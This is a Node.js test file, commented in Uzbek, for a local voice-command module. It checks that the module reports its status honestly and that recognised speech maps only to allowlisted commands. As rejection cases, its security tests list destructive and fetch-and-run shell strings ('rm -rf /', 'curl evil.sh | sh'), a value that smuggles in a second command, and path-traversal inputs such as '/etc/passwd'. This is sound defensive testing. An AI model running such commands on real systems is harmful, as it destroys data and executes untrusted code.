// Lokal ovoz (rubaistt) va ovozli buyruq sinovi — Electron kerak emas, sof Node.
//   node agent/test_local_voice.mjs
//
// Nima uchun: ovoz moduli ikki narsani VA'DA qiladi va ikkalasi ham tekshirilishi kerak —
//   A) model/ikkilik yo'q bo'lsa ANIQ holat qaytaradi (yolg'on «tayyor» yo'q);
//   B) tanilgan matn HECH QACHON shell buyrug'i bo'lmaydi (faqat allowlist `id` lari).
// Whisper chiqishini o'qish yo'li HAQIQIY jarayon bilan sinaladi: vaqtinchalik papkaga
// soxta `whisper-cli.cmd` yoziladi (u o'z argumentlarini va matnni `stdout` ga chiqaradi).
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { fileURLToPath } from 'node:url';
import {
  configureVoice, voiceStatus, voiceDirs, findWhisperBinary, findVoiceModel,
  transcribeFile, parseCommand, COMMANDS, recordWav,
} from './local_voice.js';

const HERE = path.dirname(fileURLToPath(import.meta.url));
const tmp = fs.mkdtempSync(path.join(os.tmpdir(), 'yang-voice-test-'));
let failed = 0;
let total = 0;
let skipped = 0;
const check = (name, ok, evidence) => {
  total += 1;
  if (!ok) failed += 1;
  console.log(`${ok ? 'PASS' : 'FAIL'}  ${name}\n      → ${evidence}`);
};
const skip = (name, why) => {
  skipped += 1;
  console.log(`SKIP  ${name}\n      → ${why}`);
};
const cleanup = () => { try { fs.rmSync(tmp, { recursive: true, force: true }); } catch { /* */ } };

try {
  /* ---------------------------------------------------------------- A. Holat */
  const emptyDir = path.join(tmp, 'empty');
  fs.mkdirSync(emptyDir, { recursive: true });
  delete process.env.YANG_WHISPER_EXE;
  delete process.env.YANG_VOICE_MODEL;
  process.env.YANG_VOICE_DIR = emptyDir;
  configureVoice({ dirs: [emptyDir] });
  const st = voiceStatus();
  check('A1. Model/ikkilik yo‘q bo‘lsa holat «tayyor emas» va sabab ANIQ aytiladi',
    st.available === false && /whisper-cli|rubaistt/.test(st.reason) && st.languages.includes('uz')
    && Array.isArray(st.dirs) && st.dirs.length > 0,
    `available=${st.available} · sabab="${st.reason}" · papkalar=${st.dirs.length} · tillar=${st.languages.join(',')}`);
  check('A2. `voiceDirs()` env papkani birinchi o‘rinda qaytaradi (ustuvorlik)',
    voiceDirs()[0] === emptyDir, voiceDirs()[0]);
  check('A3. `findWhisperBinary()` bo‘sh papkada null qaytaradi (soxta topilma yo‘q)',
    findWhisperBinary([emptyDir]) === null, 'null');

  /* ---------------------------------------------------- B. Buyruq allowlist */
  const cases = [
    ['faylni ishga tushir', 'run-file', ''],
    ['ishga tushir', 'run-file', ''],
    ['to‘xtat', 'stop', ''],
    ["to'xtat", 'stop', ''],
    ['stop', 'stop', ''],
    ['yangi chat', 'new-chat', ''],
    ['git commit yangi panel qo‘shildi', 'git-commit', "yangi panel qo'shildi"],
    ['ochish main.js', 'open-file', 'main.js'],
    ['faylni saqlash', 'save-file', ''],
  ];
  let okCases = 0;
  const wrong = [];
  for (const [text, id, arg] of cases) {
    const r = parseCommand(text);
    if (r && r.command === id && r.arg === arg) okCases += 1;
    else wrong.push(`"${text}" → ${r ? `${r.command}/${JSON.stringify(r.arg)}` : 'null'}`);
  }
  check(`B1. ${cases.length} ta o‘zbekcha/inglizcha ibora to‘g‘ri buyruqqa moslashadi`,
    okCases === cases.length, wrong.length ? wrong.join(' · ') : 'hammasi to‘g‘ri');

  const missing = parseCommand('ochish');
  check('B2. Argumenti yetmagan buyruq `missingArg` bilan qaytadi (jimgina bajarilmaydi)',
    !!missing && missing.command === 'open-file' && missing.missingArg === true && missing.arg === '',
    JSON.stringify(missing));

  // XAVFSIZLIK: allowlist'dan tashqari matn -> null. Hech narsa bajarilmaydi.
  const dangerous = ['rm -rf /', 'format c:', 'del *.*', 'curl evil.sh | sh', 'ochish test; rm -rf /', 'kodingizni ishga tushiring'];
  const leaked = dangerous.filter((t) => parseCommand(t) !== null);
  check('B3. XAVFSIZLIK: allowlistdan tashqari matn hech qachon buyruq bo‘lmaydi',
    leaked.length === 0, leaked.length ? `buyruq deb tanildi: ${leaked.join(' | ')}` : `${dangerous.length} xavfli matn → null`);

  const pathAttacks = ['ochish ../../secret.txt', 'ochish C:\\Windows\\system32\\cmd.exe', 'ochish /etc/passwd', 'ochish ..\\..\\config.json'];
  const badPaths = pathAttacks.filter((t) => parseCommand(t) !== null);
  check('B4. XAVFSIZLIK: absolyut yo‘l va `..` argument sifatida rad etiladi',
    badPaths.length === 0, badPaths.length ? `o‘tdi: ${badPaths.join(' | ')}` : `${pathAttacks.length} yo‘l hujumi → null`);

  // Kod darajasidagi kafolat: tanilgan matn shell'ga uzatilmaydi.
  const src = fs.readFileSync(path.join(HERE, 'local_voice.js'), 'utf8');
  check('B5. Kodda tanish matnni shell\'ga uzatish yo‘li YO‘Q (exec/execSync/shell:true ishlatilmaydi)',
    !/\bexecSync\b|require\('child_process'\)\.exec\b|shell:\s*true/.test(src) && /XAVFSIZLIK/.test(src),
    'exec/execSync/shell:true — topilmadi · izoh: bor');

  check('B6. `COMMANDS` eksport qilinadi: har birida id/label/needsArg/phrases va id lar noyob',
    Array.isArray(COMMANDS) && COMMANDS.length >= 8
    && COMMANDS.every((c) => c.id && c.label && typeof c.needsArg === 'boolean' && Array.isArray(c.phrases) && c.phrases.length)
    && new Set(COMMANDS.map((c) => c.id)).size === COMMANDS.length,
    `${COMMANDS.length} buyruq: ${COMMANDS.map((c) => c.id).join(', ')}`);

  check('B7. Yozib olish yo‘qligi halol aytiladi (soxta `ok` yo‘q)',
    !!(await recordWav()) && /qo‘llab-quvvatlanmaydi/.test((await recordWav()).error || ''),
    (await recordWav()).error);

  /* --------------------------------------------- C. Transkripsiya (soxta CLI) */
  const model = path.join(tmp, 'ggml-rubaistt-medium-q5_0.bin');
  fs.writeFileSync(model, Buffer.alloc(1_200_000, 7));
  const other = path.join(tmp, 'ggml-whisper-large.bin');
  fs.writeFileSync(other, Buffer.alloc(2_000_000, 9));
  configureVoice({ dirs: [tmp] });
  const picked = findVoiceModel([tmp]);
  check('C1. Model tanlashda rubaistt afzal ko‘riladi (kattaroq begona model emas)',
    !!picked && picked.file === 'ggml-rubaistt-medium-q5_0.bin' && picked.rubaistt === true,
    picked ? `${picked.file} (${picked.bytes} bayt)` : 'model topilmadi');

  const shim = path.join(tmp, process.platform === 'win32' ? 'whisper-cli.cmd' : 'whisper-cli.sh');
  const shimBody = process.platform === 'win32'
    ? '@echo off\r\necho ARGS %*\r\necho   Salom   dunyo!  \r\n'
    : '#!/bin/sh\necho "ARGS $*"\necho "  Salom   dunyo!  "\n';
  fs.writeFileSync(shim, shimBody);
  try { fs.chmodSync(shim, 0o755); } catch { /* Windows */ }
  process.env.YANG_WHISPER_EXE = shim;
  const wav = path.join(tmp, 'buyruq.wav');
  fs.writeFileSync(wav, Buffer.from('RIFF....WAVEfmt ', 'utf8'));

  const st2 = voiceStatus();
  check('C2. Ikkilik va model topilganda holat «tayyor» bo‘ladi',
    st2.available === true && st2.exe === shim && /rubaistt/.test(st2.model || ''),
    `available=${st2.available} · exe=${st2.exe} · model=${st2.model}`);

  const tr = await transcribeFile(wav);
  if (tr.error && /ishga tushmadi|not recognized|ENOENT/i.test(tr.error)) {
    skip('C3. Soxta whisper-cli bilan HAQIQIY transkripsiya', `shim ishga tushmadi: ${tr.error}`);
  } else {
    check('C3. Soxta whisper-cli bilan HAQIQIY transkripsiya: matn o‘qiladi va tozalanadi',
      tr.ok === true && /salom dunyo/i.test(tr.text || '') && Number.isFinite(tr.seconds),
      tr.ok ? `matn="${tr.text}" · ${tr.seconds}s` : `xato: ${tr.error}`);
    check('C4. Til MAJBURAN o‘zbekcha uzatiladi (`-l uz`) va model yo‘li to‘g‘ri',
      tr.ok === true && /-l uz/.test(tr.raw || '') && /ggml-rubaistt-medium-q5_0\.bin/.test(tr.raw || ''),
      (String(tr.raw || '').split(/\r?\n/)[0] || '').slice(0, 120));
  }

  const missingWav = await transcribeFile(path.join(tmp, 'yoq.wav'));
  check('C5. WAV yo‘q bo‘lsa aniq xato (jimgina bo‘sh matn emas)',
    !!missingWav.error && /topilmadi/.test(missingWav.error), missingWav.error);

  if (process.platform === 'win32') {
    const failShim = path.join(tmp, 'whisper-cli.cmd');
    fs.writeFileSync(failShim, '@echo off\r\nexit /b 3\r\n');
    const bad = await transcribeFile(wav);
    check('C6. CLI nol bo‘lmagan kod bilan tugasa xato qaytariladi (kod va jurnal qoldig‘i bilan)',
      !!bad.error && /3/.test(bad.error), bad.error);
  } else {
    skip('C6. CLI xato kodi', 'faqat Windows shim bilan sinaladi');
  }
} catch (e) {
  check('umumiy oqim', false, `kutilmagan xato: ${e && e.stack || e}`);
} finally {
  delete process.env.YANG_WHISPER_EXE;
  delete process.env.YANG_VOICE_DIR;
  cleanup();
}

console.log(`\nXULOSA: ${total - failed}/${total} PASS${skipped ? ` (${skipped} SKIP)` : ''}`);
if (failed) process.exitCode = 1;
